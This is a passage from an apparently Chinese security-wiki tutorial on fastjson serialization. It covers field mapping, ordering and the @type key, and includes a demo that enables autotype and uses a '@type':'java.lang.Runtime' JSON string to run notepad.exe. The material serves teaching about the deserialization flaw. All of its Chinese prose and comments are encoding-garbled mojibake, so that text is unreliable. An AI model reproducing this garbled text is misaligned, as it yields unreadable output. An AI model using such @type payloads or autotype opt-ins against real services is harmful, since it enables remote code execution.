     * 2. å¯ä»¥è®¿é—®å¤–éƒ¨ç±»çš„é™æ€æˆå‘˜å’Œæ–¹æ³•ï¼Œä½†ä¸èƒ½ç›´æ¥è®¿é—®å¤–éƒ¨ç±»çš„éé™æ€æˆå‘˜å’Œæ–¹æ³•ã€‚
     * 3. é™æ€å†…éƒ¨ç±»å¯ä»¥åŒ…å«é™æ€æˆå‘˜ã€é™æ€æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥åŒ…å«éé™æ€æˆå‘˜å’Œæ–¹æ³•ã€‚
     * 4. é™æ€å†…éƒ¨ç±»çš„å®ä¾‹ä¸æŒæœ‰å¤–éƒ¨ç±»çš„å¼•ç”¨ï¼Œå› æ­¤ä¸ä¼šé€ æˆå†…å­˜æ³„æ¼ã€‚
     * 5. é™æ€å†…éƒ¨ç±»ä¸å¤–éƒ¨ç±»ä¹‹é—´çš„å…³ç³»æ›´åƒæ˜¯æ™®é€šçš„ç±»ä¹‹é—´çš„å…³ç³»ï¼Œè€Œä¸æ˜¯å†…éƒ¨ç±»å’Œå¤–éƒ¨ç±»ä¹‹é—´çš„å…³ç³»ã€‚
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> name<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> age<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// å°†ä¸€ä¸ª Java å¯¹è±¡åºåˆ—åŒ–ä¸º Json å­—ç¬¦ä¸²</span>
        <span class="token class-name">Person</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">&quot;Aaa&quot;</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> jsonString1 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>person1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonString1<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// å°†ä¸€ä¸ª Json å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸º Java å¯¹è±¡</span>
        <span class="token class-name">String</span> jsonString2 <span class="token operator">=</span> <span class="token string">&quot;{\&quot;age\&quot;:88, \&quot;name\&quot;:\&quot;Bbb\&quot;}&quot;</span><span class="token punctuation">;</span>
        <span class="token class-name">Person</span> person2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString2<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;, &quot;</span> <span class="token operator">+</span> person2<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// è¾“å‡ºè¿™ä¸ªç”± fastjson åˆ›å»ºçš„ Person ç±»å¯¹è±¡</span>
        <span class="token class-name">String</span> jsonString3 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>person2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonString3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410113026-d82i252.a06b6811.png" alt="image" loading="lazy">â€‹</p><h3 id="ç–‘é—®ä¸€-æ˜ å°„å…³ç³»" tabindex="-1"><a class="header-anchor" href="#ç–‘é—®ä¸€-æ˜ å°„å…³ç³»"><span>ç–‘é—®ä¸€ï¼šæ˜ å°„å…³ç³»</span></a></h3><p>â€‹<code>Person person2 = JSON.parseObject(jsonString2, Person.class);</code>â€‹</p><p>è¿™é‡Œä¸ºä»€ä¹ˆå¯ä»¥ç›´æ¥ä½¿ç”¨ Person.class æ¥è¿›è¡Œæ˜ å°„ï¼Ÿ</p><p>åœ¨ä½¿ç”¨ <code>fastjson</code>â€‹ æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå°† <code>JSON</code>â€‹ å­—ç¬¦ä¸²å’Œ <code>Java</code>â€‹ å¯¹è±¡ä¹‹é—´å»ºç«‹æ˜ å°„å…³ç³»ï¼Œå¯ä»¥é€šè¿‡ç±»çš„å±æ€§å’Œ <code>JSON</code>â€‹ å­—æ®µåè¿›è¡Œæ˜ å°„ã€‚åœ¨æˆ‘ä»¬ä¸Šé¢çš„ä»£ç ä¸­ï¼Œ<code>Java</code>â€‹ ç±»çš„å±æ€§åå’Œ <code>JSON</code>â€‹ å­—æ®µåæ˜¯ç›¸åŒçš„ï¼Œå› æ­¤å¯ä»¥ç›´æ¥ä½¿ç”¨ <code>Person.class</code>â€‹ æ¥è¿›è¡Œæ˜ å°„ã€‚</p><p><strong>å¦‚æœä¸åŒæˆ‘ä»¬è¯¥æ€ä¹ˆåŠï¼Ÿ</strong> æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨æ³¨è§£æ¥æŒ‡å®šå®ƒä»¬ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚åœ¨ <code>fastjson</code>â€‹ ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ <code>@JSONField</code>â€‹ æ³¨è§£æ¥æŒ‡å®š <code>Java</code>â€‹ ç±»çš„å±æ€§å’Œ <code>JSON</code>â€‹ å­—æ®µä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚</p><ul><li>åœ¨ Person ç±»å±æ€§ä¸Šæ·»åŠ æ³¨è§£æ˜ å°„</li><li>ä½¿ç”¨å¯¹åº”çš„ Json å­—æ®µåï¼ˆkeyï¼‰</li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token annotation punctuation">@JSONField</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">&quot;user_name&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
<span class="token annotation punctuation">@JSONField</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">&quot;user_age&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>

<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
<span class="token class-name">String</span> jsonString2 <span class="token operator">=</span> <span class="token string">&quot;{\&quot;user_name\&quot;:\&quot;Bbb\&quot;,\&quot;user_age\&quot;:88}&quot;</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410133920-0ay0ab9.f4d8f7f9.png" alt="image" loading="lazy">â€‹</p><h3 id="ç–‘é—®äºŒ-é¡ºåºå…³ç³»" tabindex="-1"><a class="header-anchor" href="#ç–‘é—®äºŒ-é¡ºåºå…³ç³»"><span>ç–‘é—®äºŒï¼šé¡ºåºå…³ç³»</span></a></h3><p>ä¸ºä»€ä¹ˆæˆ‘åˆå§‹åŒ–å¯¹è±¡çš„æ—¶å€™ï¼Œä»£ç æ˜æ˜å†™çš„æ˜¯ï¼š</p><p>â€‹<code>Person person1 = new Person(&quot;Aaa&quot;, 99);</code></p><p>name åœ¨å‰ï¼Œage åœ¨åï¼Œæ€ä¹ˆè½¬åŒ–æˆ json å­—ç¬¦ä¸²çš„æ—¶å€™å°±å˜æˆäº† age åœ¨å‰ï¼Œname åœ¨åäº†ï¼Ÿ</p><p>åŸæ¥ï¼Œåœ¨ <code>fastjson</code>â€‹ ä¸­ï¼Œ<strong>é»˜è®¤æƒ…å†µä¸‹</strong>ï¼Œç”Ÿæˆçš„ <code>JSON</code>â€‹ å­—ç¬¦ä¸²çš„é¡ºåºæ˜¯æŒ‰ç…§<strong>å±æ€§çš„å­—æ¯é¡ºåº</strong>è¿›è¡Œæ’åºçš„ï¼Œè€Œä¸æ˜¯æŒ‰ç…§å±æ€§åœ¨ç±»ä¸­çš„å£°æ˜é¡ºåºã€‚å¦‚æœæˆ‘ä»¬å¸Œæœ›æŒ‰ç…§å±æ€§åœ¨ç±»ä¸­çš„å£°æ˜é¡ºåºæ¥ç”Ÿæˆ <code>JSON</code>â€‹ å­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡åœ¨ç±»ä¸­ä½¿ç”¨ <code>@JSONType</code>â€‹ æ³¨è§£æ¥è®¾ç½®å±æ€§çš„åºåˆ—åŒ–é¡ºåºã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// åœ¨ç±»å‰ç”¨æ³¨è§£å£°æ˜å±æ€§é¡ºåº</span>
<span class="token annotation punctuation">@JSONType</span><span class="token punctuation">(</span>orders <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410134240-15ouxe2.e49dc772.png" alt="image" loading="lazy">â€‹</p><h3 id="ç–‘é—®ä¸‰-typeâ€‹" tabindex="-1"><a class="header-anchor" href="#ç–‘é—®ä¸‰-typeâ€‹"><span>ç–‘é—®ä¸‰ï¼š<code>@type</code>â€‹</span></a></h3><p>â€‹<code>@type</code>â€‹ æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Ÿå¦‚ä½•ååºåˆ—åŒ–å¸¦ <code>@type</code>â€‹ çš„ json å­—ç¬¦ä¸²ï¼Ÿ</p><blockquote><p><a href="https://www.cnblogs.com/nice0e3/p/14601670.html" target="_blank" rel="noopener noreferrer">Java å®‰å…¨ä¹‹ Fastjson ååºåˆ—åŒ–æ¼æ´åˆ†æ - nice_0e3<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><p>å¾ˆå¤šè®² <code>fastjson</code>â€‹ ååºåˆ—åŒ–æ¼æ´çš„æ–‡ç« ï¼Œé‡Œé¢éƒ½æåˆ°äº† <code>@type</code>â€‹ï¼Œé‚£ä¹ˆå®ƒåˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>â€‹<code>@type</code>â€‹ æ˜¯ <code>fastjson</code>â€‹ ä¸­çš„ä¸€ä¸ª<mark>ç‰¹æ®Šæ³¨è§£</mark>ï¼Œç”¨äºæ ‡è¯† <code>JSON</code>â€‹ å­—ç¬¦ä¸²ä¸­çš„æŸä¸ªå±æ€§æ˜¯ä¸€ä¸ª <code>Java</code>â€‹ å¯¹è±¡çš„ç±»å‹ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œå½“ <code>fastjson</code>â€‹ ä» <code>JSON</code>â€‹ å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸º <code>Java</code>â€‹ å¯¹è±¡æ—¶ï¼Œå¦‚æœ <code>JSON</code>â€‹ å­—ç¬¦ä¸²ä¸­åŒ…å« <code>@type</code>â€‹ å±æ€§ï¼Œ<code>fastjson</code>â€‹ ä¼šæ ¹æ®è¯¥å±æ€§çš„å€¼æ¥ç¡®å®šååºåˆ—åŒ–åçš„ <code>Java</code>â€‹ å¯¹è±¡çš„ç±»å‹ã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> fastjson <span class="token operator">=</span> <span class="token string">&quot;{\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;,\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;,\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;}&quot;</span><span class="token punctuation">;</span>
        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAccept</span><span class="token punctuation">(</span><span class="token string">&quot;java.lang&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>fastjson<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&quot;notepad.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>è¿è¡Œä¸Šé¢çš„ä»£ç ä¼šæ‰“å¼€è®°äº‹æœ¬ã€‚</p><p>ç”±äº <code>fastjson</code>â€‹ åœ¨ <code>1.2.24</code>â€‹ ä¹‹åé»˜è®¤ç¦ç”¨ Autotypeï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬é€šè¿‡ <code>ParserConfig.getGlobalInstance().addAccept(&quot;java.lang&quot;);</code>â€‹ æ¥å¼€å¯ï¼Œå¦åˆ™ä¼šæŠ¥é”™ <code>autoType is not support</code>â€‹ã€‚ã€ç›®å‰æˆ‘ä»¬æ­å»ºçš„ç¯å¢ƒä½¿ç”¨çš„æ˜¯ 1.2.50 ç‰ˆæœ¬ã€‘</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410141121-u3bq855.bb746963.png" alt="image" loading="lazy">â€‹</p><p>â€‹ <strong>ã€SerializerFeature.WriteClassNameã€‘</strong> â€‹</p><p>å’Œå‰é¢ä»£ç åšå¯¹æ¯”ï¼Œå‘ç°å…¶å®å°±æ˜¯åœ¨è°ƒç”¨ <code>toJSONString</code>â€‹ æ–¹æ³•çš„æ—¶å€™ï¼Œå‚æ•°é‡Œé¢å¤šäº†ä¸€ä¸ª <code>SerializerFeature.WriteClassName</code>â€‹ æ–¹æ³•ã€‚</p><p>JSON æ ‡å‡†æ˜¯ä¸æ”¯æŒè‡ªçœçš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ ¹æ® JSON æ–‡æœ¬ï¼Œä¸çŸ¥é“å®ƒåŒ…å«çš„å¯¹è±¡çš„ç±»å‹ã€‚ä¼ å…¥ <code>SerializerFeature.WriteClassName</code>â€‹ å¯ä»¥ä½¿å¾— <code>Fastjson</code>â€‹ æ”¯æŒ&quot;å†…çœï¼ˆIntrospectionï¼‰&quot;[^1]ï¼Œå¼€å¯è‡ªçœååºåˆ—åŒ–æˆ <code>JSON</code>â€‹ çš„æ•°æ®å°±ä¼šå¤šä¸€ä¸ª <code>@type</code>â€‹ï¼Œè¿™ä¸ªæ˜¯ä»£è¡¨å¯¹è±¡ç±»å‹çš„ <code>JSON</code>â€‹ æ–‡æœ¬ã€‚</p><p>â€‹<code>FastJson</code>â€‹ çš„æ¼æ´å°±æ˜¯ä»–çš„è¿™ä¸€ä¸ªåŠŸèƒ½äº§ç”Ÿçš„ï¼Œåœ¨å¯¹è¯¥ <code>JSON</code>â€‹ æ•°æ®è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šå»è°ƒç”¨æŒ‡å®šç±»ä¸­å¯¹äºçš„ <code>get/set/is</code>â€‹ æ–¹æ³•ï¼Œ åé¢ä¼šè¯¦ç»†åˆ†æã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">JSONField</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">JSONType</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializerFeature</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@JSONType</span><span class="token punctuation">(</span>orders <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@JSONField</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">&quot;user_name&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
        <span class="token annotation punctuation">@JSONField</span><span class="token punctuation">(</span>name
                <span class="token operator">=</span> <span class="token string">&quot;user_age&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>

        <span class="token comment">// ... æ„é€ å‡½æ•°ã€setterã€getter</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">&quot;Person{&quot;</span> <span class="token operator">+</span>
                    <span class="token string">&quot;name=&#39;&quot;</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">&#39;\&#39;&#39;</span> <span class="token operator">+</span>
                    <span class="token string">&quot;, age=&quot;</span> <span class="token operator">+</span> age <span class="token operator">+</span>
                    <span class="token char">&#39;}&#39;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Person</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        user<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        user<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">&quot;zhaocai&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// å°† Java å¯¹è±¡è½¬æ¢ä¸º Json å­—ç¬¦ä¸²</span>
        <span class="token class-name">String</span> s1 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> <span class="token class-name">SerializerFeature<span class="token punctuation">.</span>WriteClassName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240410154558-7epb8u7.df736ec1.png" alt="image" loading="lazy">â€‹</p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä»¥ä¸‹ä¸‰ç§æ–¹å¼æ¥ååºåˆ—åŒ– <code>json</code>â€‹ å­—ç¬¦ä¸²äº†ã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// æ–¹æ³•ä¸€ï¼šè¿”å› JSONObject å¯¹è±¡</span>
<span class="token class-name">Person</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
person1<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
person1<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">&quot;zhaocai_1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">String</span> s1 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>person1<span class="token punctuation">,</span> <span class="token class-name">SerializerFeature<span class="token punctuation">.</span>WriteClassName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Object</span> jsonObject <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonObject <span class="token operator">+</span> <span class="token string">&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// æ–¹æ³•äºŒï¼šè¿”å› Person å¯¹è±¡</span>
<span class="token class-name">Person</span> person2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
person2<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
person2<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">&quot;zhaocai_2&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">String</span> s2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>person2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Person</span> person2_2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>s2<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">// éè‡ªçœ</span>
